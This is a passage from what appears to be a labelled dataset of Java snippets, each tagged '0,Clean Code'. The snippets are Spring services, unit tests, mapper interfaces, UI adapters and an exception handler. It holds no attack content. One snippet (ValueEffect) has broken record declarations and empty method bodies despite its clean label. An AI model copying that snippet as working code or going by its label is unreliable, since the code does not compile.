    assertEquals(1,pageResult.getTotal());
    assertEquals(1,pageResult.getList().size());
    assertPojoEquals(dbNotice,pageResult.getList().get(0));
  }
  @Test public void testGetNotice_success(){
    NoticeDO dbNotice=randomPojo(NoticeDO.class);
    noticeMapper.insert(dbNotice);
    NoticeDO notice=noticeService.getNotice(dbNotice.getId());
    assertNotNull(notice);
    assertPojoEquals(dbNotice,notice);
  }
  @Test public void testCreateNotice_success(){
    NoticeSaveReqVO reqVO=randomPojo(NoticeSaveReqVO.class).setId(null);
    Long noticeId=noticeService.createNotice(reqVO);
    assertNotNull(noticeId);
    NoticeDO notice=noticeMapper.selectById(noticeId);
    assertPojoEquals(reqVO,notice,""id"");
  }
  @Test public void testUpdateNotice_success(){
    NoticeDO dbNoticeDO=randomPojo(NoticeDO.class);
    noticeMapper.insert(dbNoticeDO);
    NoticeSaveReqVO reqVO=randomPojo(NoticeSaveReqVO.class,o -> o.setId(dbNoticeDO.getId()));
    noticeService.updateNotice(reqVO);
    NoticeDO notice=noticeMapper.selectById(reqVO.getId());
    assertPojoEquals(reqVO,notice);
  }
  @Test public void testDeleteNotice_success(){
    NoticeDO dbNotice=randomPojo(NoticeDO.class);
    noticeMapper.insert(dbNotice);
    noticeService.deleteNotice(dbNotice.getId());
    assertNull(noticeMapper.selectById(dbNotice.getId()));
  }
  @Test public void testValidateNoticeExists_success(){
    NoticeDO dbNotice=randomPojo(NoticeDO.class);
    noticeMapper.insert(dbNotice);
    noticeService.validateNoticeExists(dbNotice.getId());
  }
  @Test public void testValidateNoticeExists_noExists(){
    assertServiceException(() -> noticeService.validateNoticeExists(randomLongId()),NOTICE_NOT_FOUND);
  }
}
",0,Clean Code
"/** 
 * Tests for  {@link InitDestroyBeanPostProcessor}.
 * @author Stephane Nicoll
 */
class InitDestroyBeanPostProcessorTests {
  @Test void initMethodIsInvoked(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    beanFactory.addBeanPostProcessor(new InitDestroyBeanPostProcessor(beanFactory,Map.of(""test"",List.of(""start"")),Collections.emptyMap()));
    beanFactory.registerBeanDefinition(""test"",mockBeanDefinition(LifecycleSampleBean.class));
    LifecycleSampleBean bean=beanFactory.getBean(""test"",LifecycleSampleBean.class);
    verify(bean).start();
    verifyNoMoreInteractions(bean);
  }
  @Test void initMethodIsInvokedInOrder(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    beanFactory.addBeanPostProcessor(new InitDestroyBeanPostProcessor(beanFactory,Map.of(""test"",List.of(""start"",""start2"")),Collections.emptyMap()));
    beanFactory.registerBeanDefinition(""test"",mockBeanDefinition(LifecycleSampleBean.class));
    LifecycleSampleBean bean=beanFactory.getBean(""test"",LifecycleSampleBean.class);
    InOrder inOrder=inOrder(bean);
    inOrder.verify(bean).start();
    inOrder.verify(bean).start2();
    verifyNoMoreInteractions(bean);
  }
  @Test void destroyMethodIsInvoked(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    beanFactory.addBeanPostProcessor(new InitDestroyBeanPostProcessor(beanFactory,Collections.emptyMap(),Map.of(""test"",List.of(""stop""))));
    beanFactory.registerBeanDefinition(""test"",mockBeanDefinition(LifecycleSampleBean.class));
    LifecycleSampleBean bean=beanFactory.getBean(""test"",LifecycleSampleBean.class);
    verifyNoInteractions(bean);
    beanFactory.destroySingletons();
    verify(bean).stop();
    verifyNoMoreInteractions(bean);
  }
  @Test void destroyMethodIsInvokedInOrder(){
    DefaultListableBeanFactory beanFactory=new DefaultListableBeanFactory();
    beanFactory.addBeanPostProcessor(new InitDestroyBeanPostProcessor(beanFactory,Collections.emptyMap(),Map.of(""test"",List.of(""stop"",""stop2""))));
    beanFactory.registerBeanDefinition(""test"",mockBeanDefinition(LifecycleSampleBean.class));
    LifecycleSampleBean bean=beanFactory.getBean(""test"",LifecycleSampleBean.class);
    beanFactory.destroySingletons();
    InOrder inOrder=inOrder(bean);
    inOrder.verify(bean).stop();
    inOrder.verify(bean).stop2();
    verifyNoMoreInteractions(bean);
  }
  private RootBeanDefinition mockBeanDefinition(  Class<?> type){
    Object instance=mock(type);
    RootBeanDefinition beanDefinition=new RootBeanDefinition(type);
    beanDefinition.setInstanceSupplier(() -> instance);
    return beanDefinition;
  }
static class LifecycleSampleBean {
    public void start(){
    }
    void start2(){
    }
    public void stop(){
    }
    void stop2(){
    }
  }
}
",0,Clean Code
"/** 
 * 字典
 * @Author 1024创新实验室: 罗伊
 * @Date 2022/5/26 19:40:55
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
@Mapper @Component public interface DictValueDao extends BaseMapper<DictValueEntity> {
  /** 
 * 查找所有未删除的自带key
 */
  List<DictValueEntity> selectByDeletedFlag(  @Param(""deletedFlag"") Boolean deletedFlag);
  /** 
 * 查找所有未删除的自带key
 */
  List<DictValueEntity> selectByDeletedFlagAndKeyId(  @Param(""dictKeyId"") Long dictKeyId,  @Param(""deletedFlag"") Boolean deletedFlag);
  /** 
 * 逻辑删除
 */
  void updateDeletedFlagByIdList(  @Param(""dictValueIdList"") List<Long> dictValueIdList,  @Param(""deletedFlag"") Boolean deletedFlag);
  /** 
 * 分页查询
 */
  List<DictValueVO> query(  Page page,  @Param(""query"") DictValueQueryForm queryForm);
  /** 
 * 跟进code查询
 */
  DictValueEntity selectByCode(  @Param(""valueCode"") String valueCode,  @Param(""deletedFlag"") Boolean deletedFlag);
}
/** 
 * 字典
 * @Author 1024创新实验室: 罗伊
 * @Date 2022/5/26 19:40:55
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
@Mapper @Component public interface DictValueDao extends BaseMapper<DictValueEntity> {
  /** 
 * 查找所有未删除的自带key
 */
  List<DictValueEntity> selectByDeletedFlag(  @Param(""deletedFlag"") Boolean deletedFlag);
  /** 
 * 查找所有未删除的自带key
 */
  List<DictValueEntity> selectByDeletedFlagAndKeyId(  @Param(""dictKeyId"") Long dictKeyId,  @Param(""deletedFlag"") Boolean deletedFlag);
  /** 
 * 逻辑删除
 */
  void updateDeletedFlagByIdList(  @Param(""dictValueIdList"") List<Long> dictValueIdList,  @Param(""deletedFlag"") Boolean deletedFlag);
  /** 
 * 分页查询
 */
  List<DictValueVO> query(  Page page,  @Param(""query"") DictValueQueryForm queryForm);
  /** 
 * 跟进code查询
 */
  DictValueEntity selectByCode(  @Param(""valueCode"") String valueCode,  @Param(""deletedFlag"") Boolean deletedFlag);
}
",0,Clean Code
"/** 
 * 文件 Service 实现类
 * @author 芋道源码
 */
@Service public class FileServiceImpl implements FileService {
  @Resource private FileConfigService fileConfigService;
  @Resource private FileMapper fileMapper;
  @Override public PageResult<FileDO> getFilePage(  FilePageReqVO pageReqVO){
    return fileMapper.selectPage(pageReqVO);
  }
  @Override @SneakyThrows public String createFile(  String name,  String path,  byte[] content){
    String type=FileTypeUtils.getMineType(content,name);
    if (StrUtil.isEmpty(path)) {
      path=FileUtils.generatePath(content,name);
    }
    if (StrUtil.isEmpty(name)) {
      name=path;
    }
    FileClient client=fileConfigService.getMasterFileClient();
    Assert.notNull(client,""客户端(master) 不能为空"");
    String url=client.upload(content,path,type);
    FileDO file=new FileDO();
    file.setConfigId(client.getId());
    file.setName(name);
    file.setPath(path);
    file.setUrl(url);
    file.setType(type);
    file.setSize(content.length);
    fileMapper.insert(file);
    return url;
  }
  @Override public Long createFile(  FileCreateReqVO createReqVO){
    FileDO file=BeanUtils.toBean(createReqVO,FileDO.class);
    fileMapper.insert(file);
    return file.getId();
  }
  @Override public void deleteFile(  Long id) throws Exception {
    FileDO file=validateFileExists(id);
    FileClient client=fileConfigService.getFileClient(file.getConfigId());
    Assert.notNull(client,""客户端({}) 不能为空"",file.getConfigId());
    client.delete(file.getPath());
    fileMapper.deleteById(id);
  }
  private FileDO validateFileExists(  Long id){
    FileDO fileDO=fileMapper.selectById(id);
    if (fileDO == null) {
      throw exception(FILE_NOT_EXISTS);
    }
    return fileDO;
  }
  @Override public byte[] getFileContent(  Long configId,  String path) throws Exception {
    FileClient client=fileConfigService.getFileClient(configId);
    Assert.notNull(client,""客户端({}) 不能为空"",configId);
    return client.getContent(path);
  }
  @Override public FilePresignedUrlRespVO getFilePresignedUrl(  String path) throws Exception {
    FileClient fileClient=fileConfigService.getMasterFileClient();
    FilePresignedUrlRespDTO presignedObjectUrl=fileClient.getPresignedObjectUrl(path);
    return BeanUtils.toBean(presignedObjectUrl,FilePresignedUrlRespVO.class,object -> object.setConfigId(fileClient.getId()));
  }
}
",0,Clean Code
"/** 
 * Configuration manager
 * @author boyan (boyan@alibaba-inc.com)<p> 2018-Apr-04 2:24:54 PM
 */
public class ConfigurationManager {
  private static final Logger LOG=LoggerFactory.getLogger(ConfigurationManager.class);
  private final LinkedList<ConfigurationEntry> configurations=new LinkedList<>();
  private ConfigurationEntry snapshot=new ConfigurationEntry();
  /** 
 * Adds a new conf entry.
 */
  public boolean add(  final ConfigurationEntry entry){
    if (!this.configurations.isEmpty()) {
      if (this.configurations.peekLast().getId().getIndex() >= entry.getId().getIndex()) {
        LOG.error(""Did you forget to call truncateSuffix before the last log index goes back."");
        return false;
      }
    }
    return this.configurations.add(entry);
  }
  /** 
 * [1, first_index_kept) are being discarded
 */
  public void truncatePrefix(  final long firstIndexKept){
    while (!this.configurations.isEmpty() && this.configurations.peekFirst().getId().getIndex() < firstIndexKept) {
      this.configurations.pollFirst();
    }
  }
  /** 
 * (last_index_kept, infinity) are being discarded
 */
  public void truncateSuffix(  final long lastIndexKept){
    while (!this.configurations.isEmpty() && this.configurations.peekLast().getId().getIndex() > lastIndexKept) {
      this.configurations.pollLast();
    }
  }
  public ConfigurationEntry getSnapshot(){
    return this.snapshot;
  }
  public void setSnapshot(  final ConfigurationEntry snapshot){
    this.snapshot=snapshot;
  }
  public ConfigurationEntry getLastConfiguration(){
    if (this.configurations.isEmpty()) {
      return snapshot;
    }
 else {
      return this.configurations.peekLast();
    }
  }
  public ConfigurationEntry get(  final long lastIncludedIndex){
    if (this.configurations.isEmpty()) {
      Requires.requireTrue(lastIncludedIndex >= this.snapshot.getId().getIndex(),""lastIncludedIndex %d is less than snapshot index %d"",lastIncludedIndex,this.snapshot.getId().getIndex());
      return this.snapshot;
    }
    ListIterator<ConfigurationEntry> it=this.configurations.listIterator();
    while (it.hasNext()) {
      if (it.next().getId().getIndex() > lastIncludedIndex) {
        it.previous();
        break;
      }
    }
    if (it.hasPrevious()) {
      return it.previous();
    }
 else {
      return this.snapshot;
    }
  }
}",0,Clean Code
"/** 
 * arm emulator Created by zhkl0228 on 2017/5/2.
 */
public interface ARMEmulator<T extends NewFileIO> extends Emulator<T> {
  /** 
 * 用户模式
 */
  int USR_MODE=0b10000;
  /** 
 * 管理模式
 */
  int SVC_MODE=0b10011;
  int R_ARM_ABS32=2;
  int R_ARM_REL32=3;
  int R_ARM_COPY=20;
  int R_ARM_GLOB_DAT=21;
  int R_ARM_JUMP_SLOT=22;
  int R_ARM_RELATIVE=23;
  int R_ARM_IRELATIVE=160;
  int R_AARCH64_ABS64=257;
  int R_AARCH64_ABS32=258;
  int R_AARCH64_ABS16=259;
  int R_AARCH64_PREL64=260;
  int R_AARCH64_PREL32=261;
  int R_AARCH64_PREL16=262;
  int R_AARCH64_COPY=1024;
  int R_AARCH64_GLOB_DAT=1025;
  int R_AARCH64_JUMP_SLOT=1026;
  int R_AARCH64_RELATIVE=1027;
  int R_AARCH64_TLS_TPREL64=1030;
  int R_AARCH64_TLS_DTPREL32=1031;
  int R_AARCH64_IRELATIVE=1032;
  int PAGE_ALIGN=0x1000;
  int EXCP_UDEF=1;
  int EXCP_SWI=2;
  int EXCP_BKPT=7;
}
",0,Clean Code
"/** 
 * @author wangchao
 * @date 2020/08/28
 */
public abstract class AbstractTranslator implements Translator {
  private final Map<String,String> en2chCacheMap=new ConcurrentHashMap<>();
  private final Map<String,String> ch2enCacheMap=new ConcurrentHashMap<>();
  /** 
 * 配置 
 */
  private EasyDocConfig config;
  @Override public String en2Ch(  String text){
    if (text == null || text.length() == 0) {
      return """";
    }
    String res=en2chCacheMap.get(text);
    if (res != null && res.length() > 0) {
      return res;
    }
    res=translateEn2Ch(text);
    if (res != null && res.length() > 0) {
      en2chCacheMap.put(text,res);
    }
    return res == null ? """" : res;
  }
  @Override public String ch2En(  String text){
    if (text == null || text.length() == 0) {
      return """";
    }
    String res=ch2enCacheMap.get(text);
    if (res != null && res.length() > 0) {
      return res;
    }
    res=translateCh2En(text);
    if (res != null && res.length() > 0) {
      ch2enCacheMap.put(text,res);
    }
    return res == null ? """" : res;
  }
  @Override public Translator init(  EasyDocConfig config){
    this.config=config;
    return this;
  }
  @Override public EasyDocConfig getConfig(){
    return this.config;
  }
  /** 
 * 清除缓存
 */
  @Override public void clearCache(){
    en2chCacheMap.clear();
    ch2enCacheMap.clear();
  }
  /** 
 * 中译英
 * @param text 文本
 * @return {@link String}
 */
  protected abstract String translateCh2En(  String text);
  /** 
 * 英译中
 * @param text 文本
 * @return {@link String}
 */
  protected abstract String translateEn2Ch(  String text);
}",0,Clean Code
"public class ZkNodeTreeCell extends JFXTreeCell<ZkNode> {
  private PrettyZooFacade prettyZooFacade=new PrettyZooFacade();
  private Text node=new Text();
  public ZkNodeTreeCell(  Runnable createAction,  Runnable deleteAction){
    node.getStyleClass().add(""text"");
    ResourceBundle rb=ResourceBundleUtils.get(prettyZooFacade.getLocale());
    String addButtonText=rb.getString(""nodeList.button.add"");
    var add=new JFXButton(addButtonText);
    Label addGraphic=new Label();
    addGraphic.getStyleClass().add(""add-button"");
    add.setGraphic(addGraphic);
    add.setOnAction(e -> createAction.run());
    String deleteButtonText=rb.getString(""nodeList.button.delete"");
    var delete=new JFXButton(deleteButtonText);
    Label deleteGraphic=new Label();
    deleteGraphic.getStyleClass().add(""remove-button"");
    delete.setGraphic(deleteGraphic);
    delete.setOnAction(e -> {
      deleteAction.run();
    }
);
    ContextMenu contextMenu=new ContextMenu(new CustomMenuItem(add),new CustomMenuItem(delete));
    this.setContextMenu(contextMenu);
  }
  @Override protected void updateItem(  ZkNode item,  boolean empty){
    super.updateItem(item,empty);
    if (empty || item == null) {
      setText(null);
      setGraphic(null);
    }
 else {
      node.setText(item.getName());
      if (item.getEphemeralOwner() != 0) {
        node.setFill(Color.valueOf(""#ffab00""));
      }
      final HBox hbox=new HBox();
      hbox.getChildren().add(node);
      setGraphic(hbox);
      setText(null);
    }
  }
}
",0,Clean Code
"interface ValueEffect extends Enchantment.Effect {
  @NotNull BinaryTagSerializer<ValueEffect> NBT_TYPE=BinaryTagSerializer.registryTaggedUnion(Registries::enchantmentValueEffects,ValueEffect::nbtType,""type"");
  @ApiStatus.Internal static @NotNull DynamicRegistry<BinaryTagSerializer<? extends ValueEffect>> createDefaultRegistry(){
    final DynamicRegistry<BinaryTagSerializer<? extends ValueEffect>> registry=DynamicRegistry.create(""minestom:enchantment_value_effect"");
    registry.register(""add"",Add.NBT_TYPE,DataPack.MINECRAFT_CORE);
    registry.register(""all_of"",AllOf.NBT_TYPE,DataPack.MINECRAFT_CORE);
    registry.register(""multiply"",Multiply.NBT_TYPE,DataPack.MINECRAFT_CORE);
    registry.register(""remove_binomial"",RemoveBinomial.NBT_TYPE,DataPack.MINECRAFT_CORE);
    registry.register(""set"",Set.NBT_TYPE,DataPack.MINECRAFT_CORE);
    return registry;
  }
  float apply(  float base,  int level);
  @NotNull BinaryTagSerializer<? extends ValueEffect> nbtType();
  record Add(  @NotNull LevelBasedValue value);
  public static final BinaryTagSerializer<Add> NBT_TYPE=BinaryTagSerializer.object(""value"",LevelBasedValue.NBT_TYPE,Add::value,Add::new);
  @Override public float apply(  float base,  int level){
  }
  @Override public @NotNull BinaryTagSerializer<Add> nbtType(){
  }
  record AllOf(  @NotNull List<ValueEffect> effects);
  public static final BinaryTagSerializer<AllOf> NBT_TYPE=BinaryTagSerializer.object(""effects"",ValueEffect.NBT_TYPE.list(),AllOf::effects,AllOf::new);
{
    effects=List.copyOf(effects);
  }
  @Override public float apply(  float base,  int level){
  }
  @Override public @NotNull BinaryTagSerializer<AllOf> nbtType(){
  }
  record Multiply(  @NotNull LevelBasedValue factor);
  public static final BinaryTagSerializer<Multiply> NBT_TYPE=BinaryTagSerializer.object(""factor"",LevelBasedValue.NBT_TYPE,Multiply::factor,Multiply::new);
  @Override public float apply(  float base,  int level){
  }
  @Override public @NotNull BinaryTagSerializer<Multiply> nbtType(){
  }
  record RemoveBinomial(  @NotNull LevelBasedValue chance);
  public static final BinaryTagSerializer<RemoveBinomial> NBT_TYPE=BinaryTagSerializer.object(""chance"",LevelBasedValue.NBT_TYPE,RemoveBinomial::chance,RemoveBinomial::new);
  @Override public float apply(  float base,  int level){
  }
  @Override public @NotNull BinaryTagSerializer<RemoveBinomial> nbtType(){
  }
  record Set(  @NotNull LevelBasedValue value);
  public static final BinaryTagSerializer<Set> NBT_TYPE=BinaryTagSerializer.object(""value"",LevelBasedValue.NBT_TYPE,Set::value,Set::new);
  @Override public float apply(  float base,  int level){
  }
  @Override public @NotNull BinaryTagSerializer<Set> nbtType(){
  }
}
",0,Clean Code
"@SpringBootTest(webEnvironment=SpringBootTest.WebEnvironment.RANDOM_PORT,properties={""management.endpoints.web.exposure.include=*"",""springdoc.use-management-port=true"",""management.server.port=9294"",""management.server.base-path=/test"",""management.endpoints.web.base-path=/application""}) class SpringDocApp15Test extends AbstractSpringDocActuatorTest {
  @Test void testIndex(){
    EntityExchangeResult<byte[]> getResult=webTestClient.get().uri(""/application/swagger-ui/index.html"").exchange().expectStatus().isOk().expectBody().returnResult();
    assertThat(getResult.getResponseBody()).isNotNull();
    String contentAsString=new String(getResult.getResponseBody());
    assertThat(contentAsString).contains(""Swagger UI"");
  }
  @Test void testIndexActuator(){
    HttpStatusCode httpStatusMono=webClient.get().uri(""/test/application/swagger-ui"").exchangeToMono(clientResponse -> Mono.just(clientResponse.statusCode())).block();
    assertThat(httpStatusMono).isEqualTo(HttpStatus.FOUND);
  }
  @Test void testIndexSwaggerConfig() throws Exception {
    String contentAsString=webClient.get().uri(""/test/application/swagger-ui/swagger-config"").retrieve().bodyToMono(String.class).block();
    String expected=getContent(""results/app15-1.json"");
    assertEquals(expected,contentAsString,true);
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
@SpringBootTest(webEnvironment=SpringBootTest.WebEnvironment.RANDOM_PORT,properties={""management.endpoints.web.exposure.include=*"",""springdoc.use-management-port=true"",""management.server.port=9394"",""management.server.base-path=/test"",""management.endpoints.web.base-path=/application""}) class SpringDocApp15Test extends AbstractSpringDocActuatorTest {
  @Test void testIndex() throws Exception {
    MvcResult mvcResult=mockMvc.perform(get(""/application/swagger-ui/index.html"")).andExpect(status().isOk()).andReturn();
    String contentAsString=mvcResult.getResponse().getContentAsString();
    assertTrue(contentAsString.contains(""Swagger UI""));
  }
  @Test void testIndexActuator(){
    String contentAsString=actuatorRestTemplate.getForObject(""/test/application/swagger-ui"",String.class);
    assertTrue(contentAsString.contains(""Swagger UI""));
  }
  @Test void testIndexSwaggerConfig() throws Exception {
    String contentAsString=actuatorRestTemplate.getForObject(""/test/application/swagger-ui/swagger-config"",String.class);
    String expected=getContent(""results/app15-1.json"");
    assertEquals(expected,contentAsString,true);
  }
@SpringBootApplication static class SpringDocTestApp {
  }
}
",0,Clean Code
"public interface QueueFactoryInterface {
  String EXECUTION_NAMED=""executionQueue"";
  String EXECUTOR_NAMED=""executorQueue"";
  String WORKERJOB_NAMED=""workerJobQueue"";
  String WORKERTASKRESULT_NAMED=""workerTaskResultQueue"";
  String WORKERTRIGGERRESULT_NAMED=""workerTriggerResultQueue"";
  String FLOW_NAMED=""flowQueue"";
  String TEMPLATE_NAMED=""templateQueue"";
  String WORKERTASKLOG_NAMED=""workerTaskLogQueue"";
  String METRIC_QUEUE=""workerTaskMetricQueue"";
  String KILL_NAMED=""executionKilledQueue"";
  String WORKERINSTANCE_NAMED=""workerInstanceQueue"";
  String WORKERJOBRUNNING_NAMED=""workerJobRunningQueue"";
  String TRIGGER_NAMED=""triggerQueue"";
  String SUBFLOWEXECUTIONRESULT_NAMED=""subflowExecutionResultQueue"";
  String CLUSTER_EVENT_NAMED=""clusterEventQueue"";
  String SUBFLOWEXECUTIONEND_NAMED=""subflowExecutionEndQueue"";
  QueueInterface<Execution> execution();
  QueueInterface<Executor> executor();
  QueueInterface<WorkerJob> workerJob();
  QueueInterface<WorkerTaskResult> workerTaskResult();
  QueueInterface<WorkerTriggerResult> workerTriggerResult();
  QueueInterface<LogEntry> logEntry();
  QueueInterface<MetricEntry> metricEntry();
  QueueInterface<FlowWithSource> flow();
  QueueInterface<ExecutionKilled> kill();
  QueueInterface<Template> template();
  QueueInterface<WorkerInstance> workerInstance();
  QueueInterface<WorkerJobRunning> workerJobRunning();
  QueueInterface<Trigger> trigger();
  WorkerJobQueueInterface workerJobQueue();
  WorkerTriggerResultQueueInterface workerTriggerResultQueue();
  QueueInterface<SubflowExecutionResult> subflowExecutionResult();
  QueueInterface<SubflowExecutionEnd> subflowExecutionEnd();
}
",0,Clean Code
"class ExpandableListAdapter extends BaseExpandableListAdapter {
  private LayoutInflater inflater;
  public ExpandableListAdapter(  Context context){
    inflater=LayoutInflater.from(context);
  }
  @Override public int getGroupCount(){
    return categoryList.size();
  }
  @Override public int getChildrenCount(  int groupPosition){
    return categoryList.get(groupPosition).caseList.length;
  }
  @Override public Object getGroup(  int groupPosition){
    if (groupPosition >= 0)     return categoryList.get(groupPosition);
 else     return null;
  }
  @Override public Object getChild(  int groupPosition,  int childPosition){
    return categoryList.get(groupPosition).caseList[childPosition];
  }
  @Override public long getGroupId(  int groupPosition){
    return groupPosition;
  }
  @Override public long getChildId(  int groupPosition,  int childPosition){
    return childPosition;
  }
  @Override public boolean hasStableIds(){
    return true;
  }
  @Override public View getGroupView(  int groupPosition,  boolean isExpanded,  View convertView,  ViewGroup parent){
    CaseCategoryHolder groupHolder=null;
    if (convertView == null) {
      groupHolder=new CaseCategoryHolder();
      convertView=inflater.inflate(R.layout.layout_case_category_item,null);
      groupHolder.textCategory=(TextView)convertView.findViewById(R.id.tv_category);
      convertView.setTag(groupHolder);
    }
 else {
      groupHolder=(CaseCategoryHolder)convertView.getTag();
    }
    expandStatus.put(groupPosition,isExpanded);
    String title=((UseCaseCategory)getGroup(groupPosition)).title;
    groupHolder.textCategory.setText(isExpanded ? title + "" - "" : title + "" + "");
    return convertView;
  }
  @Override public View getChildView(  int groupPosition,  int childPosition,  boolean isLastChild,  View convertView,  ViewGroup parent){
    CaseItemHolder childHolder=null;
    if (convertView == null) {
      childHolder=new CaseItemHolder();
      convertView=inflater.inflate(R.layout.layout_case_item,null);
      childHolder.textName=(TextView)convertView.findViewById(R.id.tv_case);
      convertView.setTag(childHolder);
    }
 else {
      childHolder=(CaseItemHolder)convertView.getTag();
    }
    childHolder.textName.setText(((UseCase)getChild(groupPosition,childPosition)).getName());
    return convertView;
  }
  @Override public boolean isChildSelectable(  int groupPosition,  int childPosition){
    return true;
  }
}
",0,Clean Code
"/** 
 * 字典数据 控制器
 * @author geekidea
 * @since 2023-11-25
 */
@Slf4j @RestController @Tag(name=""字典数据"") @RequestMapping(""/admin/sysDict"") public class SysDictController {
  @Autowired private SysDictService sysDictService;
  /** 
 * 添加字典数据
 * @param dto
 * @return
 * @throws Exception
 */
  @Log(value=""添加字典数据"",type=SysLogType.ADD) @PostMapping(""/addSysDict"") @Operation(summary=""添加字典数据"") @Permission(""sys:dict:add"") public ApiResult addSysDict(  @Valid @RequestBody SysDictDto dto){
    boolean flag=sysDictService.addSysDict(dto);
    return ApiResult.result(flag);
  }
  /** 
 * 修改字典数据
 * @param dto
 * @return
 * @throws Exception
 */
  @Log(value=""修改字典数据"",type=SysLogType.UPDATE) @PostMapping(""/updateSysDict"") @Operation(summary=""修改字典数据"") @Permission(""sys:dict:update"") public ApiResult updateSysDict(  @Valid @RequestBody SysDictDto dto){
    boolean flag=sysDictService.updateSysDict(dto);
    return ApiResult.result(flag);
  }
  /** 
 * 删除字典数据
 * @param id
 * @return
 * @throws Exception
 */
  @Log(value=""删除字典数据"",type=SysLogType.DELETE) @PostMapping(""/deleteSysDict/{id}"") @Operation(summary=""删除字典数据"") @Permission(""sys:dict:delete"") public ApiResult deleteSysDict(  @PathVariable Long id){
    boolean flag=sysDictService.deleteSysDict(id);
    return ApiResult.result(flag);
  }
  /** 
 * 获取字典数据详情
 * @param id
 * @return
 * @throws Exception
 */
  @PostMapping(""/getSysDict/{id}"") @Operation(summary=""字典数据详情"") @Permission(""sys:dict:info"") public ApiResult<SysDictVo> getSysDict(  @PathVariable Long id){
    SysDictVo sysDictVo=sysDictService.getSysDictById(id);
    return ApiResult.success(sysDictVo);
  }
  /** 
 * 字典数据分页列表
 * @param query
 * @return
 * @throws Exception
 */
  @PostMapping(""/getSysDictPage"") @Operation(summary=""字典数据分页列表"") @Permission(""sys:dict:page"") public ApiResult<SysDictVo> getSysDictPage(  @Valid @RequestBody SysDictQuery query){
    Paging<SysDictVo> paging=sysDictService.getSysDictPage(query);
    return ApiResult.success(paging);
  }
}",0,Clean Code
"/** 
 * Event fired when a Service's state is changing.
 */
@SuppressWarnings(""serial"") public final class ServiceStateChangeEvent extends ApplicationEvent {
  @Serial private static final long serialVersionUID=1L;
  /** 
 * Opaque map of properties associated to a service.
 */
  private final Map<String,Object> properties;
  /** 
 * Creates a new  {@link ServiceStateChangeEvent} instance.
 * @param source       The object on which the Event initially occurred.
 * @throws IllegalArgumentException if source is null.
 */
  public ServiceStateChangeEvent(  @NotNull final Service source){
    this(source,null);
  }
  /** 
 * Creates a new  {@link ServiceStateChangeEvent} instance.
 * @param source       The object on which the Event initially occurred.
 * @param properties   The properties to pass the event listeners.
 * @throws IllegalArgumentException if source is null.
 */
  public ServiceStateChangeEvent(  @NotNull final Service source,  @Nullable final Map<String,Object> properties){
    super(source);
    this.properties=properties;
  }
  /** 
 * Gets the properties attached to the service.
 * @return  a map of key/value pairs.
 */
  public Map<String,Object> properties(){
    return properties;
  }
  public Service getService(){
    return (Service)getSource();
  }
}
",0,Clean Code
"@Slf4j @RestControllerAdvice @Order(value=Ordered.HIGHEST_PRECEDENCE) public class GlobalExceptionHandler {
  @ExceptionHandler(value=UnauthenticatedException.class) @ResponseStatus(HttpStatus.UNAUTHORIZED) public RestResponse handelUnauthenticatedException(  UnauthenticatedException e){
    log.error(""Unauthenticated."",e);
    return RestResponse.fail(ResponseCode.CODE_UNAUTHORIZED,""Unauthenticated."");
  }
  @ExceptionHandler(value=AuthenticationException.class) @ResponseStatus(HttpStatus.UNAUTHORIZED) public RestResponse handelUnauthenticatedException(  AuthenticationException e){
    log.error(""Permission denied."",e);
    return RestResponse.fail(ResponseCode.CODE_UNAUTHORIZED,""Permission denied."");
  }
  @ExceptionHandler(value=AbstractApiException.class) @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR) public RestResponse handleException(  AbstractApiException e){
    log.error(""api exception:"",e);
    return RestResponse.fail(e.getResponseCode(),e.getMessage());
  }
  @ExceptionHandler(value=Exception.class) @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR) @Order(value=Ordered.HIGHEST_PRECEDENCE) public RestResponse handleException(  Exception e){
    log.error(""internal server error:"",e);
    return RestResponse.fail(ResponseCode.CODE_FAIL,""internal server error: "" + ExceptionUtils.stringifyException(e));
  }
  /** 
 * Unified processing of request parameter verification (entity object parameter transfer)
 * @param e BindException
 * @return RestResponse
 */
  @ExceptionHandler(BindException.class) @ResponseStatus(HttpStatus.BAD_REQUEST) public RestResponse validExceptionHandler(  BindException e){
    log.error(""bind exception:"",e);
    StringBuilder message=new StringBuilder();
    List<FieldError> fieldErrors=e.getBindingResult().getFieldErrors();
    for (    FieldError error : fieldErrors) {
      message.append(error.getField()).append(error.getDefaultMessage()).append(StringPool.COMMA);
    }
    message=new StringBuilder(message.substring(0,message.length() - 1));
    return RestResponse.fail(ResponseCode.CODE_FAIL,message.toString());
  }
  /** 
 * Unified processing of request parameter verification (ordinary parameter transfer)
 * @param e ConstraintViolationException
 * @return RestResponse
 */
  @ExceptionHandler(value=ConstraintViolationException.class) @ResponseStatus(HttpStatus.BAD_REQUEST) public RestResponse handleConstraintViolationException(  ConstraintViolationException e){
    log.error(""constraint violation exception:"",e);
    StringBuilder message=new StringBuilder();
    Set<ConstraintViolation<?>> violations=e.getConstraintViolations();
    for (    ConstraintViolation<?> violation : violations) {
      Path path=violation.getPropertyPath();
      String[] pathArr=StringUtils.splitByWholeSeparatorPreserveAllTokens(path.toString(),StringPool.DOT);
      message.append(pathArr[1]).append(violation.getMessage()).append(StringPool.COMMA);
    }
    message=new StringBuilder(message.substring(0,message.length() - 1));
    return RestResponse.fail(ResponseCode.CODE_FAIL,message.toString());
  }
}
",0,Clean Code
"@SuppressLint(""NewApi"") public class ShadowFragmentSupport {
  public static ShadowActivity fragmentGetActivity(  Fragment fragment){
    PluginContainerActivity pluginContainerActivity=(PluginContainerActivity)fragment.getActivity();
    if (pluginContainerActivity == null) {
      return null;
    }
    return (ShadowActivity)PluginActivity.get(pluginContainerActivity);
  }
  public static Context fragmentGetContext(  Fragment fragment){
    Context context=fragment.getContext();
    if (context instanceof PluginContainerActivity) {
      return PluginActivity.get((PluginContainerActivity)context);
    }
 else {
      return context;
    }
  }
  public static Object fragmentGetHost(  Fragment fragment){
    Object host=fragment.getHost();
    if (host instanceof PluginContainerActivity) {
      return PluginActivity.get((PluginContainerActivity)host);
    }
 else {
      return host;
    }
  }
